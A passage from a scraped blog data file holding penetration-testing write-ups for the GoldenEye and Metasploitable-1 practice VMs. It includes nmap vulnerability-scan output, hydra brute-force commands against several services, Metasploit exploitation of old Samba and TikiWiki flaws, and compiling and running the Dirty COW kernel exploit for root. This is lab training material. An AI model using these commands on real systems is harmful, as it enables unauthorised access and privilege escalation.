__ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675329715883.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Not shown: 65531 closed tcp ports (reset)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;PORT      STATE SERVICE&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;25/tcp    open  smtp&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;| smtp-vuln-cve2010-4344: &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|_  The SMTP server is not Exim: NOT VULNERABLE&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;| ssl-dh-params: &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|   VULNERABLE:&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     State: VULNERABLE&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       Transport Layer Security (TLS) services that use anonymous&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       Diffie-Hellman key exchange only provide protection against passive&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       eavesdropping, and are vulnerable to active man-in-the-middle attacks&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       which could completely compromise the confidentiality and integrity&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       of any data exchanged over the resulting session.&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     Check results:&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       ANONYMOUS DH GROUP 1&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|             Cipher Suite: TLS_DH_anon_EXPORT_WITH_DES40_CBC_SHA&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|             Modulus Type: Safe prime&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|             Modulus Source: Unknown/Custom-generated&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|             Modulus Length: 512&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|             Generator Length: 8&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|             Public Key Length: 512&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     References:&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       https://www.ietf.org/rfc/rfc2246.txt&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|   &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     State: VULNERABLE&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     IDs:  BID:74733  CVE:CVE-2015-4000&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       The Transport Layer Security (TLS) protocol contains a flaw that is&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       triggered when handling Diffie-Hellman key exchanges defined with&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       to downgrade the security of a TLS session to 512-bit export-grade&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       cryptography, which is significantly weaker, allowing the attacker&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       to more easily break the encryption and monitor or tamper with&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       the encrypted stream.&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     Disclosure date: 2015-5-19&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     Check results:&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       EXPORT-GRADE DH GROUP 1&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|             Modulus Type: Safe prime&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|             Modulus Source: Unknown/Custom-generated&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|             Modulus Length: 512&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|             Generator Length: 8&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|             Public Key Length: 512&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     References:&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       https://weakdh.org&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       https://www.securityfocus.com/bid/74733&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|   &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|   Diffie-Hellman Key Exchange Insufficient Group Strength&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     State: VULNERABLE&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       Transport Layer Security (TLS) services that use Diffie-Hellman groups&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       of insufficient strength, especially those using one of a few commonly&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       shared groups, may be susceptible to passive eavesdropping attacks.&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     Check results:&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       WEAK DH GROUP 1&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|             Modulus Type: Safe prime&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|             Modulus Source: postfix builtin&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|             Modulus Length: 1024&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|             Generator Length: 8&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|             Public Key Length: 1024&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     References:&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|_      https://weakdh.org&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;| ssl-poodle: &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|   VULNERABLE:&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|   SSL POODLE information leak&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     State: VULNERABLE&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     IDs:  BID:70574  CVE:CVE-2014-3566&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|           products, uses nondeterministic CBC padding, which makes it easier&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|           for man-in-the-middle attackers to obtain cleartext data via a&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|           padding-oracle attack, aka the \&quot;POODLE\&quot; issue.&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     Disclosure date: 2014-10-14&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     Check results:&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       TLS_RSA_WITH_AES_128_CBC_SHA&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     References:&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       https://www.securityfocus.com/bid/70574&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       https://www.imperialviolet.org/2014/10/14/poodle.html&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       https://www.openssl.org/~bodo/ssl-poodle.pdf&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;80/tcp    open  http&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|_http-csrf: Couldn&#39;t find any CSRF vulnerabilities.&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|_http-dombased-xss: Couldn&#39;t find any DOM based XSS.&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;| http-slowloris-check: &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|   VULNERABLE:&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|   Slowloris DOS attack&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     State: LIKELY VULNERABLE&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     IDs:  CVE:CVE-2007-6750&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       Slowloris tries to keep many connections to the target web server open and hold&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       them open as long as possible.  It accomplishes this by opening connections to&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       the target web server and sending a partial request. By doing so, it starves&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       the http server&#39;s resources causing Denial Of Service.&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     Disclosure date: 2009-09-17&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     References:&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       http://ha.ckers.org/slowloris/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|_http-stored-xss: Couldn&#39;t find any stored XSS vulnerabilities.&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;55006/tcp open  unknown&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;| ssl-poodle: &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|   VULNERABLE:&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|   SSL POODLE information leak&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     State: VULNERABLE&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     IDs:  BID:70574  CVE:CVE-2014-3566&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|           products, uses nondeterministic CBC padding, which makes it easier&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|           for man-in-the-middle attackers to obtain cleartext data via a&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|           padding-oracle attack, aka the \&quot;POODLE\&quot; issue.&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     Disclosure date: 2014-10-14&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     Check results:&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       TLS_RSA_WITH_AES_128_CBC_SHA&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     References:&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       https://www.securityfocus.com/bid/70574&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       https://www.imperialviolet.org/2014/10/14/poodle.html&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       https://www.openssl.org/~bodo/ssl-poodle.pdf&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;| ssl-dh-params: &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|   VULNERABLE:&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|   Diffie-Hellman Key Exchange Insufficient Group Strength&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     State: VULNERABLE&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       Transport Layer Security (TLS) services that use Diffie-Hellman groups&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       of insufficient strength, especially those using one of a few commonly&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       shared groups, may be susceptible to passive eavesdropping attacks.&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     Check results:&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       WEAK DH GROUP 1&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|             Modulus Type: Safe prime&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|             Modulus Source: Unknown/Custom-generated&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|             Modulus Length: 1024&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|             Generator Length: 8&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|             Public Key Length: 1024&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     References:&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|_      https://weakdh.org&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;55007/tcp open  unknown&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;MAC Address: 00:0C:29:8D:FC:67 (VMware)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Nmap done: 1 IP address (1 host up) scanned in 323.07 seconds&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;command-summary\&quot;&gt;Command Summary&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#command-summary\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;&quot;],&quot;metadata&quot;:[0,{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;information-gathering&quot;],&quot;text&quot;:[0,&quot;Information gathering&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;method-1&quot;],&quot;text&quot;:[0,&quot;Method-1&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;step-1-intrude-the-login-pagefailed&quot;],&quot;text&quot;:[0,&quot;step-1 Intrude the login page(failed)&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;step-2-view-home-page-source&quot;],&quot;text&quot;:[0,&quot;step-2 View home page source.&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;step-3-pop3&quot;],&quot;text&quot;:[0,&quot;step-3 POP3&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;step-4-login-mailbox&quot;],&quot;text&quot;:[0,&quot;step-4 Login mailbox&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;step-5-login-in-gnocertdir&quot;],&quot;text&quot;:[0,&quot;step-5 Login in gnocertdir&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;step-6-moodlecms-exploitation&quot;],&quot;text&quot;:[0,&quot;step-6 Moodlecms exploitation&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;step-7-privilege-escalation&quot;],&quot;text&quot;:[0,&quot;Step-7 Privilege escalation&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;method-2-reverse-shell&quot;],&quot;text&quot;:[0,&quot;Method-2 Reverse shell&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;step-6-moodlecms-exploitation-1&quot;],&quot;text&quot;:[0,&quot;Step-6 Moodlecms exploitation&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;step-7-privilege-escalation-1&quot;],&quot;text&quot;:[0,&quot;Step-7 Privilege escalation&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;enclosure&quot;],&quot;text&quot;:[0,&quot;Enclosure&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;command-summary&quot;],&quot;text&quot;:[0,&quot;Command Summary&quot;]}]]],&quot;localImagePaths&quot;:[1,[[0,&quot;img/1675389865498.png&quot;],[0,&quot;img/1675389870691.png&quot;],[0,&quot;img/1675389847203.png&quot;],[0,&quot;img/1675390018821.png&quot;],[0,&quot;img/1675390162371.png&quot;],[0,&quot;img/1675390345344.png&quot;],[0,&quot;img/1675390355645.png&quot;],[0,&quot;img/1675390815369.png&quot;],[0,&quot;img/1675391828534.png&quot;],[0,&quot;img/1675391692695.png&quot;],[0,&quot;img/1675393082037.png&quot;],[0,&quot;img/1675394170762.png&quot;],[0,&quot;img/1675394314719.png&quot;],[0,&quot;img/1675394962917.png&quot;],[0,&quot;img/1675395021833.png&quot;],[0,&quot;img/1675395868856.png&quot;],[0,&quot;img/1675396334057.png&quot;],[0,&quot;img/1675396627851.png&quot;],[0,&quot;img/1675845464385.png&quot;],[0,&quot;img/1675905870571.png&quot;],[0,&quot;img/1675905558594.png&quot;],[0,&quot;img/1675906171442.png&quot;],[0,&quot;img/1675911223227.png&quot;],[0,&quot;img/1675912183070.png&quot;],[0,&quot;img/1675912534581.png&quot;],[0,&quot;img/1675912972431.png&quot;],[0,&quot;img/1675913050473.png&quot;],[0,&quot;img/1675914702007.png&quot;],[0,&quot;img/1675329659408.png&quot;],[0,&quot;img/1675329715883.png&quot;]]],&quot;remoteImagePaths&quot;:[1,[]],&quot;frontmatter&quot;:[0,{&quot;title&quot;:[0,&quot;GodenEye&quot;],&quot;date&quot;:[3,&quot;2023-02-08T03:01:48.000Z&quot;],&quot;categories&quot;:[0,&quot;Reproduction&quot;],&quot;tags&quot;:[1,[[0,&quot;漏洞复现&quot;],[0,&quot;OSCP&quot;]]]}],&quot;imagePaths&quot;:[1,[[0,&quot;img/1675389865498.png&quot;],[0,&quot;img/1675389870691.png&quot;],[0,&quot;img/1675389847203.png&quot;],[0,&quot;img/1675390018821.png&quot;],[0,&quot;img/1675390162371.png&quot;],[0,&quot;img/1675390345344.png&quot;],[0,&quot;img/1675390355645.png&quot;],[0,&quot;img/1675390815369.png&quot;],[0,&quot;img/1675391828534.png&quot;],[0,&quot;img/1675391692695.png&quot;],[0,&quot;img/1675393082037.png&quot;],[0,&quot;img/1675394170762.png&quot;],[0,&quot;img/1675394314719.png&quot;],[0,&quot;img/1675394962917.png&quot;],[0,&quot;img/1675395021833.png&quot;],[0,&quot;img/1675395868856.png&quot;],[0,&quot;img/1675396334057.png&quot;],[0,&quot;img/1675396627851.png&quot;],[0,&quot;img/1675845464385.png&quot;],[0,&quot;img/1675905870571.png&quot;],[0,&quot;img/1675905558594.png&quot;],[0,&quot;img/1675906171442.png&quot;],[0,&quot;img/1675911223227.png&quot;],[0,&quot;img/1675912183070.png&quot;],[0,&quot;img/1675912534581.png&quot;],[0,&quot;img/1675912972431.png&quot;],[0,&quot;img/1675913050473.png&quot;],[0,&quot;img/1675914702007.png&quot;],[0,&quot;img/1675329659408.png&quot;],[0,&quot;img/1675329715883.png&quot;]]]}]}],&quot;collection&quot;:[0,&quot;blog&quot;]}],&quot;href&quot;:[0,&quot;/blog/post/8&quot;]}],[0,{&quot;post&quot;:[0,{&quot;id&quot;:[0,&quot;reproduction/metasploitable-1&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;Metasploitable-1&quot;],&quot;date&quot;:[3,&quot;2023-02-01T03:01:48.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;漏洞复现&quot;],[0,&quot;OSCP&quot;]]],&quot;categories&quot;:[0,&quot;Reproduction&quot;]}],&quot;body&quot;:[0,&quot;&lt;!-- more --&gt;\n\n&gt;参考教程：\n&lt;https://hack1ng4fun.github.io/2020/03/26/%E9%9D%B6%E6%9C%BA-Metasploitable-1/&gt;\n\n&lt;!-- more --&gt;\n\n扫描端口结果：\nsudo nmap -sV -Pn -T4 -p 1-65535 -O 192.168.124.28\n\n&lt;!-- more --&gt;\n# 方法1：SMB漏洞进入\n查看smb版本:\n```\nsmbmap -H 192.168.124.28\n ```\nget the version of smb: 3.0.20,we have known that smb-3.0.x has a vulnerablity (CVE-2007-2447）.\nThen we can use msf to exploit it.\n \nit&#39;s root privilege.\n\n&lt;!-- more --&gt;\n\n# 方法2：Weak password(FAIL)\nUse smb_enumusers to scan users,then arrage result to file \&quot;users\&quot;\nmy smb_enumusers didn&#39;t return unexpected result. the result is as follows:\n \nUnfortunately,I failed,I don&#39;t know why.I expected future of me to tell myself.\nbrust user of ftp,telnet,ssh,smb,MySQL,PostgreSQL\n```\nhydra -L users -e nsr ftp://192.168.124.28 -o ftpuser\nhydra -L users -e nsr ssh://192.168.124.28 -o sshuser\nhydra -L users -e nsr telnet://192.168.124.28 -o telnetuser\nhydra -L users -e nsr smb://192.168.124.28 -o smbuser\nhydra -L users -e nsr mysql://192.168.124.28 -o mysqluser\nhydra -L users -e nsr postgres://192.168.124.28 -o postgresqluser\n```\n\&quot;-e nsr\&quot; means try \&quot;n\&quot; null password\nuser msfadmin has root privilege.\nsudo -i  change to root user.\n\n&lt;!-- more --&gt;\n\n# Method 3:（CVE-2004-2687）\nThere is a weak passwd:root/root in mysql\n \nUse nmap for vulnerability scanning:\nnmap --script vuln 192.168.124.28 -p- open\nThe screenshot is as follows:(the picture is so big that I can&#39;t paste it )\n📎扫描结果.txt\nWe find a vulnerability CVE-2004-2687\n \nUse msf to exploit it,unfortunately,I failed again.I don&#39;t know why.\n \nExploit failed: A payload has not been selected\n \n \nNext is escalating privilege.\nCheck scheduled tasks:\n \nAll scripts are running with root privilege and have no \&quot;write\&quot; privilege.\nFor convenience,I transform shell to \&quot;meterpreter shell\&quot;\n \nUse kernel vulnerability to escalate privilege.\nI am counting on \&quot;dirty-cow\&quot; .\nupload /home/kali/Desktop/dirty.c /var/spool/cron\n ```\nshell\ngcc -pthread dirty.c -lcrypt -o dirty\nchmod +x dirty\n./dirty fly\n ```\nThen I get an account \&quot;firefart:fly\&quot;\n\n&lt;!-- more --&gt;\n\n# Method 4:\nThe target&#39;s port 80 is open,scan its directory\n```\ndirb http://192.168.124.28 /usr/share/wordlists/dirb/big.txt\n```\nfind a url : http://192.168.124.28/tikiwiki/\ntry admin:admin to login(I have change password from admin to 123456 now)\nUse msf to exploit it again\n \n \nIt&#39;s account:\&quot;ww-data\&quot;\nUse CVE-2009-1185 to escalate privilege.\n \n \nNow,it&#39;s accont \&quot;firefart&#39;,because I have used dirty-cow in method3\n\n&lt;!-- more --&gt;\n\n# Method 5:\nI have find port 8180 in nmap result,\nIt&#39;s a website based on tomcat.Login it depend on weak password 